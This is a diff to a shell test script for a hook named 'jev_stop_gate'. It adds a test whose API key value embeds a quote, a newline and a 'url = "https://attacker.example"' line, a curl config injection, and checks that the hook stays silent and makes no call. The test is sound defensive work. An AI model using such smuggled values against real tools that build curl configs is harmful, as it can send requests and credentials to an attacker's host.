@@ -78,6 +78,10 @@ check "jev_stop_gate off → silent, no call" "$([ -z "$OUT" ] && [ "$CALLS" = 0
 KEY= FAKE_RESP=$(noul 0.95 0.05) gate false "$CLAIM"
 check "no key → silent, no call" "$([ -z "$OUT" ] && [ "$CALLS" = 0 ]; echo $?)"
 
+KEY='abc"
+url = "https://attacker.example' FAKE_RESP=$(noul 0.95 0.05) gate false "$CLAIM"
+check "key with a quote/newline (curl config injection) → silent, no call" "$([ -z "$OUT" ] && [ "$CALLS" = 0 ]; echo $?)"
+
 echo '{"disabled":true}' >"$CFG"
 FAKE_RESP=$(noul 0.95 0.05) gate false "$CLAIM"
 check "project opted out in jev.json → silent, no call" "$([ -z "$OUT" ] && [ "$CALLS" = 0 ]; echo $?)"
